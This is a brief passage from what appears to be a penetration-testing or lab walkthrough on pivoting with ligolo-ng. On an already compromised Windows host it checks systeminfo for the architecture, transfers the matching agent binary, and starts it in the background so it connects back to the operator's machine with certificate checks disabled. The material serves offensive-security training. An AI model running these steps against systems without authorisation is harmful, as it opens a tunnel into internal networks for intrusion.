Once in the target machine, check the output of the command 'systeminfo' and retrieve the architecture (x86 / x64) and the label of the procesor (amd / arm) from the 'System Type' and 'Processor(s)' field.
Then we download the correct Windows Agent binary from: https://github.com/nicocha30/ligolo-ng/releases/tag/v0.4.4 

Then we transfer the agent.exe binary to the machine and execute:

start /b \agent.exe -connect <LOCALIP>:11601 -ignore-cert
